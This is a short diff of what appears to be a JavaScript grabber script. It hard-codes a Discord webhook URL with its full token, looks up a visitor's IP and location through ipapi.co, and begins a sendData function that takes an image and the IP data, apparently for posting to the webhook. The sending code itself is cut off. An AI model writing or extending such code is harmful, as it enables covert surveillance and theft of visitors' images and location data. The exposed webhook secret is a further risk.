@@ -9,20 +9,13 @@
 const webhook = "https://discord.com/api/webhooks/1385579764592545852/x523eBesGbYlF1EtN7CEwy52A8EpvX9fOGl37Xx63YeS1sEHLAu7_kEif9krCA3bt_lY";
 
 async function getIPInfo() {
-  const urls = [
-    'https://ipapi.co/json/',
-    'https://ipinfo.io/json?token=YOUR_TOKEN', // Replace with token if needed
-    'https://api.ipify.org?format=json'
-  ];
-  for (const url of urls) {
-    try {
-      let res = await fetch(url);
-      if (!res.ok) continue;
-      let data = await res.json();
-      if (data) return data;
-    } catch {}
+  try {
+    let res = await fetch('https://ipapi.co/json/');
+    if (!res.ok) return null;
+    return await res.json();
+  } catch {
+    return null;
   }
-  return null;
 }
 
 async function sendData(imageBlob, ipInfo) {
